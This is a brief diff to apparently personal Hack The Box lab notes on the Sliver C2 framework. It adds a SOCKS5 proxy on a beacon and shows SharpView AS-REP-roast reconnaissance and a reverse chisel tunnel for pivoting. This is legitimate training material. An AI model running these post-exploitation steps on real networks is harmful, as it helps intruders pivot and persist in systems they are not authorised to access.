@@ -63,6 +63,9 @@ Sliver
     execute-assembly /home/htb-ac590/SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M
 
 # Pivoting
+    sliver (http-beacon) > socks5 start -P 1080
+    netstat -ano | grep 1080
+    
     mxdelta@htb[/htb]$ git clone https://github.com/MrAle98/chisel
     sliver (http-beacon) > chisel
     mxdelta@htb[/htb]$ chisel server --reverse -p 1337 -v --socks5
